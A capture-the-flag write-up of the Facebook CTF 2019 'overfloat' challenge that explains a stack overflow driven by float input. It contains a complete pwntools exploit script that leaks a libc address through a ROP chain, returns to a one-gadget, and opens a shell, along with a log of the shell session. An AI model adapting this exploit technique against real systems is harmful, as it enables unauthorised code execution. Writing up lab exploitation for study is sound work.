# Facebook CTF 2019

I only managed to complete a single pwn challenge (overfloat) as I was pretty busy at the time :'-(

## overfloat
The challenge revolves around a buffer overflow exploit using 32-bit float values entered via `stdin`. The float values are longitude/latitude pairs stored in an array. We use return-oriented programming (ROP) to leak the address of `fgets` in libc through the global offset table. We then return into `main()` again to enter our 2nd stage which involves a call to a one-gadget in this particular version of libc.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+10h] [bp-30h]@1

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  alarm(0x1Eu);
  __sysv_signal(14, timeout);
  puts(...);
  memset(&s, 0, 0x28uLL);
  chart_course(&s, 0LL);
  puts("BON VOYAGE!");
  return 0;
}
```

The vulnerable buffer `s` is located in `main()`, so the exploit will be triggered when `main()` returns. We can control this buffer in `chart_course()` as `s` is passed into this function. We can see that an alarm signal is setup to disconnect clients after 30 seconds has elapsed. For debugging purposes, `gdb` can be set to ignore this signal using `handle SIGALRM ignore`.

The call to `memset` indicates that `s` is _probably_ 40 bytes long.

```c
__int64 __fastcall chart_course(__int64 a1)
{
  __int64 result; // rax@6
  int v2; // xmm1_4@8
  char s; // [sp+10h] [bp-70h]@5
  int v4; // [sp+78h] [bp-8h]@8
  int i; // [sp+7Ch] [bp-4h]@1

  for ( i = 0; ; ++i )
  {
    if ( i & 1 )
      printf("LON[%d]: ", (unsigned int)(i / 2 % 10));
    else
      printf("LAT[%d]: ", (unsigned int)(i / 2 % 10));
    fgets(&s, 100, stdin);
    if ( !strncmp(&s, "done", 4uLL) )
      break;
    *(float *)&v2 = atof(&s);
    v4 = v2;
    memset(&s, 0, 0x64uLL);
    *(_DWORD *)(4LL * i + a1) = v4;
LABEL_9:
    ;
  }
  result = i & 1;
  if ( i & 1 )
  {
    puts("WHERES THE LONGITUDE?");
    --i;
    goto LABEL_9;
  }
  return result;
}
```

The `chart_course` function accepts 100 bytes of input via `stdin`, obviously overflowing the `s` buffer passed into the function. The program will loop until `done` is entered. The line `*(_DWORD *)(4LL * i + a1) = v4;` is responsible for writing the 32-bit float values into `s`. At this point, we can begin crafting our exploit.

To craft our payload, we need to use IEEE-754 floating-point values (because `atof` is used). A quick way of testing this is to use this tool: https://www.h-schmidt.net/FloatConverter/IEEE754.html. For example, let's say we want to enter 0x12345678, the "typical way" would be to use `\x78\x56\x34\x12`, this value would be entered as `5.6904566E-28`. As we're storing longitude and latitude pairs, which are both 32-bits - we write the lower 32-bits using the longitude, and the upper 32-bits using the latitude input. So for `0x0000000012345678` we enter `5.6904566E-28` followed by `0`, creating a 64-bit address with null-bytes allowed.

### overfloat.py

```python
#!/usr/bin/python2

#
# [braeden@localhost dist]$ python overfloat.py
# [+] Opening connection to challenges.fbctf.com on port 1341: Done
# [+] fgets: 0x7f7b45286b20
# [+] libc: 0x7f7b45208000
# [+] one_gadget: 0x7f7b452572c5
# [*] Switching to interactive mode
#                                  _ .--.
#                                 ( `    )
#                              .-'      `--,
#                   _..----.. (             )`-.
#                 .'_|` _|` _|(  .__,           )
#                /_|  _|  _|  _(        (_,  .-'
#               ;|  _|  _|  _|  '-'__,--'`--'
#               | _|  _|  _|  _| |
#           _   ||  _|  _|  _|  _|
#         _( `--.\_|  _|  _|  _|/
#      .-'       )--,|  _|  _|.`
#     (__, (_      ) )_|  _| /
#       `-.__.\ _,--'\|__|__/
#                     ;____;
#                      \YT/
#                       ||
#                      |""|
#                      '=='
#
# WHERE WOULD YOU LIKE TO GO?
# LAT[0]: LON[0]: LAT[1]: LON[1]: LAT[2]: LON[2]: LAT[3]: LON[3]: LAT[4]: LON[4]: LAT[5]: LON[5]: LAT[6]: LON[6]: LAT[7]: LON[7]: LAT[8]: BON VOYAGE!
# $ id
# uid=1000(overfloat) gid=1000(overfloat) groups=1000(overfloat)
# $ pwd
# /
# $ ls
# bin
# boot
# dev
# etc
# home
# lib
# lib64
# media
# mnt
# opt
# proc
# root
# run
# sbin
# srv
# sys
# tmp
# usr
# var
# $ cd home
# $ ls
# overfloat
# $ cd overfloat
# $ ls
# flag
# overfloat
# $ cat flag
# fb{FloatsArePrettyEasy...}
# $
#

from pwn import *
import struct
import binascii

p = remote('challenges.fbctf.com', 1341)
p.recvuntil(': ')

# The first part of the exploit is leaking the address of 'fgets' in libc.
for g in range(0, 14):
    p.sendline(str(g))

# All the addresses in the first stage are lead by zeroes.
def send_address(address):
    p.sendline(address)
    p.sendline('0')

send_address('5.881243E-39')    # pop rdi, ret;
send_address('8.82781E-39')     # fgets@got
send_address('5.879826E-39')    # puts(fgets@got)
send_address('5.880906E-39')    # main()
p.sendline('done')
p.recvuntil('VOYAGE!\n')

# The second stage is using the leaked libc address to return to the 1-gadget.
fgets_address = p.recvuntil('\n').strip('\n')
fgets_address = u64(fgets_address + (8 - len(fgets_address)) * '\x00')
log.success('fgets: {}'.format(hex(fgets_address)))

# The address of libc base is &fgets - offset to fgets().
libc_address  = fgets_address - 0x7eb20
log.success('libc: {}'.format(hex(libc_address)))

# This particular libc version has a 1-gadget at this address...
#   BuildID[sha1]=b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0
one_gadget_address = libc_address + 0x4f2c5
one_gadget = str(hex(one_gadget_address))
log.success('one_gadget: {}'.format(one_gadget))

# Execute 2nd stage.
for g in range(0, 14):
    p.sendline(str(g))

p.sendline(str(struct.unpack('>f', binascii.unhexlify(one_gadget[-8:]))[0]))
p.sendline(str(struct.unpack('>f', binascii.unhexlify(one_gadget[2:6].rjust(8, '0')))[0]))
p.sendline('done')

# If everything was successful, we'll get a shell ;-)
p.interactive()
p.close()
```
